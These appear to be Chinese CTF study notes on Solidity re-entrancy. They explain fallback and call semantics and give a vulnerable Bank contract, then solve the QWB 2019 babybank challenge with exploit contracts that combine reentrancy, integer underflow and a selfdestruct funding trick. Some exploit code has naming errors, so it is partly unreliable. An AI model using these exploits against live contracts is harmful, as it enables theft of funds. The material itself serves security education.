## Blockchain

### Attacks

#### Re-Entrancy

重入攻击是智能合约的经典攻击。

##### 原理

fallback函数是一个特殊的结构，在特定情况下会被触发。

特点：

1. 不被命名
2.  被外部调用，不能被自己合约的函数调用
3.  一个合约至多只有一个fallback函数
4. 会在别的合约调用一个本合约没有的函数调用
5. 当eth被发送给这个合约是，没有calldata同时没有receive函数是被触发，要设置为payable
6.  可以包含自己的逻辑

如果没有足够的Gas，是不足以支持不断重入的。`call.value()`转账给了我们足够的Gas。

`<address>.transfer(uint256 amount)`:
向 地址类型 发送数量为 amount 的 Wei，失败时抛出 **异常**，发送 2300 gas 的矿工费，不可调节。

`<address>.send(uint256 amount)`(bool):
向 地址类型 发送数量为 amount 的 Wei，失败时返回 **false**，发送 2300 gas 的矿工费用，不可调节。

`<address>.call(...)` (bool):
发出低级函数 CALL，失败时返回 false，发送所有可用 gas，可调节。
`.call`函数添加`.value`会附加上代币，形成转账

```solidity
contract Bank {
    mapping(address => uint256) public balanceOf;
    ...
    function withdraw(uint256 amount) public {
        require(balanceOf[msg.sender] >= amount);
        msg.sender.call.value(amount)();
        balanceOf[msg.sender] -= amount;
    }
}
```

当balanceof充足时，就会调用转账功能。这个问题是，先转账再记账，若再次调用fallback（）函数，此时balanceof还未减少就会无限调用，可能导致gas不够用，因此需要限制次数。

```solidity
contract hack{
address instance;
Bank b=Bank(instance);
bool flag=0;
function attack()public{
b.withdraw(1 ether);
}
function () payable{
if(!flag){
flag=1;
b.withdraw(1 ether);
}
}
}
```



##### 题目

###### 【强网杯2019】babybank

```solidity
pragma solidity ^0.4.23;

contract babybank {
    mapping(address => uint) public balance;
    mapping(address => uint) public level;
    address owner;
    uint secret;
    
    //Don't leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough.
    //Gmail is ok. 163 and qq may have some problems.
    event sendflag(string md5ofteamtoken,string b64email); 
    
    
    constructor()public{
        owner = msg.sender;
    }
    
    //pay for flag
    function payforflag(string md5ofteamtoken,string b64email) public{
        require(balance[msg.sender] >= 10000000000);
        balance[msg.sender]=0;
        owner.transfer(address(this).balance);
        emit sendflag(md5ofteamtoken,b64email);
    }
    
    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }
    
    //challenge 1 
    function profit() public{
        require(level[msg.sender]==0);
        require(uint(msg.sender) & 0xffff==0xb1b1);
        balance[msg.sender]+=1;
        level[msg.sender]+=1;
    }
    
    //challenge 2
    function set_secret(uint new_secret) public onlyOwner{
        secret=new_secret;
    }
    function guess(uint guess_secret) public{
        require(guess_secret==secret);
        require(level[msg.sender]==1);
        balance[msg.sender]+=1;
        level[msg.sender]+=1;
    }
    
    //challenge 3
    
    function transfer(address to, uint amount) public{
        require(balance[msg.sender] >= amount);
        require(amount==2);
        require(level[msg.sender]==2);
        balance[msg.sender] = 0;
        balance[to] = amount;
    }
    
    function withdraw(uint amount) public{
        require(amount==2);
        require(balance[msg.sender] >= amount);
        msg.sender.call.value(amount*100000000000000)();
        balance[msg.sender] -= amount;
    }
}
```

pay for flag
    function payforflag(string md5ofteamtoken,string b64email) public{
        require(balance[msg.sender] >= 10000000000);
        balance[msg.sender]=0;
        owner.transfer(address(this).balance);
        emit sendflag(md5ofteamtoken,b64email);
    }

当balance超过10000000000是就会触发flag函数。

发现withdraw函数发现重入漏洞 msg.sender.call.value(amount*100000000000000)();，可以配合整数下溢漏洞从而达到balance的要求。

要完成withdraw()函数需要完成三个挑战。

第一个是profit函数

require(level[msg.sender]= =0);
require(uint(msg.sender) & 0xffff==0xb1b1);

首先需要调用者level为0，其次需要调用者的后四位为b1b1，

level原本就是0，而后四位则可以通过网站生成固定账号，[Vanity-ETH | Ethereum vanity address generator](https://vanity-eth.tk/)

，即可绕过，此时balance以及level都为1，此时来到挑战2.

挑战2，需要猜到的与设置的guess相同。serect的值可以在合约的部署中找到。合约部署者的最后一次交易的inputdata桉树选择器前四个字节为函数的签名参数就是部署这传入的参数。

然后就可以调用withdraw函数。

但是由于合约没有任何blance因此需要先进行转账。

可以用selfdestruct函数来进行充值。

攻击合约

```solidity
contract kill{
function kill()payable{
selfdestruct(address(add));
}
}
contract hack{
interface BabybankInterface {
    function withdraw(uint256 amount) external;
    function profit() external;
    function guess(uint256 number) external;
    function transfer(address to, uint256 amount) external;
    function payforflag(string md5ofteamtoken, string b64email) external;
}
address instance;
BankInterface b=BankInterface(instance);
uint flag=0;
function attack()public payable{
b.profit();
b.guess(0x........);
b.withdraw(2);
b.payforflag('123','123');

}
function()external payable{
if(!flag){
flag=1;
b.withdraw(2);
}
}
}
```

